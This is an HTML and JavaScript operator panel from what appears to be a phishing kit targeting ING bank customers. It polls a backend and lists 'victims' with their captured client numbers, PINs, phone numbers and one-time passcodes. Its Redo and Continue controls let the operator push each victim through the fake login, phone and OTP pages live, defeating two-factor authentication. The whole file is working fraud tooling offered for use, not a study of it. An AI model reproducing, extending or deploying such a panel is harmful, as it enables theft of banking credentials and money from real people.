<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>ING Panel</title>
  <link rel="preconnect" href="https://rsms.me">
  <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
  <style>
    :root {
      --bg: #000000;
      --card-bg: #0b0b0b;
      --card-border: rgba(255,255,255,0.055);
      --card-border-hover: rgba(255,255,255,0.12);
      --text-primary: #f5f5f5;
      --text-muted: #8b8b8b;
      --green: #34d399;
      --red: #fb7185;
      --radius: 18px;
    }
    * { box-sizing: border-box; font-family: InterVariable, Inter, system-ui, sans-serif; }
    body { margin: 0; background: radial-gradient(circle at 50% -20%, #111 0%, #000 60%); color: var(--text-primary); }

    .greet-bar {
      max-width: 1120px;
      margin: 32px auto 0;
      padding: 0 28px;
      font-size: 20px;
      font-weight: 600;
      line-height: 1.05;
    }
    .greet-bar span { color: var(--text-primary); }

    .dashboard { max-width: 1120px; margin: 24px auto 64px; padding: 0 28px; }
    .grid { display: grid; gap: 22px; }
    .card { position: relative; background: linear-gradient(180deg, rgba(255,255,255,0.04), rgba(255,255,255,0) 55%), var(--card-bg); border: 1px solid var(--card-border); border-radius: var(--radius); padding: 22px; transition: transform 240ms cubic-bezier(.2,.8,.2,1), border-color 240ms ease, box-shadow 240ms ease; }
    .card:hover { transform: translateY(-3px); border-color: var(--card-border-hover); box-shadow: 0 18px 36px rgba(0,0,0,.55); }
    .stats { grid-template-columns: repeat(3, 1fr); }
    .stat-label { font-size: 11px; font-weight: 500; letter-spacing: 0.18em; text-transform: uppercase; color: var(--text-muted); }
    .stat-value { margin-top: 12px; font-size: 34px; font-weight: 600; line-height: 1.05; }
    .stat-change { margin-top: 6px; font-size: 12px; font-weight: 450; }
    .green { color: var(--green); } .red { color: var(--red); }
    table { width: 100%; font-size: .9rem; border-collapse: collapse; margin-top: 1rem; }
    th { text-align: left; padding: .6rem .5rem; border-bottom: 1px solid #e5e5e5; font-weight: 500; font-size: .8rem; text-transform: uppercase; color: #555; }
    td { padding: .6rem .5rem; border-bottom: 1px solid #f0f0f0; }
    tr:hover { background: #fafafa; }

    /* ----------  CLEAN GREY BUTTONS  ---------- */
    .btn {
      padding: .35rem .75rem;
      font-size: .8rem;
      border-radius: 6px;
      border: 1px solid rgba(255,255,255,.08);
      background: rgba(255,255,255,.08);
      color: var(--text-primary);
      cursor: pointer;
      transition: all .18s ease;
    }
    .btn:hover { background: rgba(255,255,255,.15); border-color: rgba(255,255,255,.2); }

    .cred { font-family: monospace; font-size: .8rem; background: #f1f1f1; padding: 2px 4px; border-radius: 3px; color:#000; }
    .detail { font-size: 12px; color: var(--text-muted); }
    #modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,.75); align-items: center; justify-content: center; }
    #modal .card { max-width: 500px; width: 90%; background: #111; border-color: #333; }
    #empty { text-align: center; color: #888; padding: 2rem 0; }
    @media (max-width: 900px) { .stats { grid-template-columns: 1fr; } }
  </style>
</head>
<body>
  <div class="greet-bar">Hello, <span id="userName">admin</span>! ‚Ä¢ <span id="clock">--:-- --</span></div>

  <div class="dashboard">
    <div class="grid stats">
      <div class="card"><div class="stat-label">Active Sessions</div><div class="stat-value" id="active">‚Äî</div></div>
      <div class="card"><div class="stat-label">Visits (total)</div><div class="stat-value" id="total">‚Äî</div></div>
      <div class="card"><div class="stat-label">Successful Logins</div><div class="stat-value" id="success">‚Äî</div></div>
    </div>

    <div class="card" style="margin-top:22px;">
      <div style="font-size:14px;font-weight:600;margin-bottom:12px;">
        Active Sessions ¬∑ <a id="domainLink" href="#" target="_blank" style="color:#007bff;text-decoration:none;"></a>
      </div>
      <table id="tbl"><thead><tr>
        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Page</th><th></th>
      </tr></thead><tbody></tbody></table>
      <div id="empty">No active sessions</div>
    </div>
  </div>

  <!-- ----------  DETAIL MODAL  ---------- -->
  <div id="modal" onclick="if(event.target===this)closeModal()">
    <div class="card">
      <div style="display:flex;justify-content:space-between;align-items:center">
        <h3 style="margin:0">Session Detail</h3><button onclick="closeModal()" class="btn">‚úï</button>
      </div>
      <div id="modalBody" style="margin-top:1rem;font-size:13px;line-height:1.6"></div>
      <div style="margin-top:1.25rem;display:flex;gap:8px">
        <button id="redoBtn"  class="btn" onclick="act('redo',  currentSid)">üîÅ Redo</button>
        <button id="contBtn"  class="btn" onclick="act('cont',  currentSid)">‚úÖ Continue</button>
        <button class="btn" onclick="act('delete',currentSid)">üóë Delete</button>
      </div>
    </div>
  </div>

  <script>
    let currentSid = null;
    const qs = s => document.querySelector(s);

    function updateClock(){
      const now = new Date();
      const h = now.getHours(), m = now.getMinutes();
      const suffix = h >= 12 ? 'pm' : 'am';
      const hh = h % 12 || 12;
      qs('#clock').textContent = `${hh}:${m.toString().padStart(2,'0')}${suffix}`;
    }
    updateClock(); setInterval(updateClock, 1000);

    function pageTitle(file){
      switch(file){
        case 'index.html':    return 'LOGIN';
        case 'verify.html':   return 'PHONE';
        case 'unregister.html':return 'UNREGISTER';
        case 'otp.html':      return 'OTP';
        default:              return file;
      }
    }

    function render(d){
      qs('#active').textContent   = d.active;
      qs('#total').textContent    = d.totalVictims;
      qs('#success').textContent  = d.success;

      const domainLink = qs('#domainLink');
      domainLink.textContent = d.domain || 'localhost';
      domainLink.href        = d.domain || 'http://localhost';

      const body = qs('#tbl tbody');
      const empty= qs('#empty');
      if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
      empty.style.display='none';
      body.innerHTML = d.sessions.map(s=>`
        <tr>
          <td>${s.victimNum}</td>
          <td><span class="cred">${s.email||'‚Äî'}</span></td>
          <td><span class="cred">${s.password||'‚Äî'}</span></td>
          <td><span class="cred">${s.phone||'‚Äî'}</span></td>
          <td><span class="cred">${s.otp||'‚Äî'}</span></td>
          <td>${s.ip}</td>
          <td>${s.platform}</td>
          <td>${s.browser}</td>
          <td>${pageTitle(s.page)}</td>
          <td><button class="btn" onclick="showDetail('${s.sid}')">Manage</button></td>
        </tr>`).join('');
    }

    function showDetail(sid){
      const s = jsonData.sessions.find(x=>x.sid===sid);
      if(!s)return;
      currentSid = sid;

      const localDate = new Date(s.dateStr).toLocaleString();

      qs('#modalBody').innerHTML = `
        <div class="detail">Session ID</div><div class="cred">${s.sid}</div>
        <div class="detail">Client number</div><div class="cred">${s.email||'‚Äî'}</div>
        <div class="detail">PIN</div><div class="cred">${s.password||'‚Äî'}</div>
        <div class="detail">Phone</div><div class="cred">${s.phone||'‚Äî'}</div>
        <div class="detail">OTP</div><div class="cred">${s.otp||'‚Äî'}</div>
        <div class="detail">IP</div><div>${s.ip}</div>
        <div class="detail">Platform</div><div>${s.platform}</div>
        <div class="detail">Browser</div><div>${s.browser}</div>
        <div class="detail">Page</div><div>${pageTitle(s.page)}</div>
        <div class="detail">User-Agent</div><div style="word-break:break-all">${s.ua}</div>
        <div class="detail">Date</div><div>${localDate}</div>`;

      // NO REDO for unregister page
      qs('#redoBtn').style.display  = (s.page==='success' || s.page==='unregister.html') ? 'none':'inline-block';
      qs('#contBtn').style.display  = s.page==='success' ? 'none':'inline-block';
      qs('#modal').style.display   = 'flex';
    }
    function closeModal(){ qs('#modal').style.display='none'; }

    async function act(action,sid){
      await fetch('/api/panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action,sid})});
      closeModal(); load();
    }

    let jsonData = {};
    async function load(){
      jsonData = await fetch('/api/panel').then(r=>r.json());
      render(jsonData);
    }
    load(); setInterval(load,2000);
  </script>
</body>
</html>
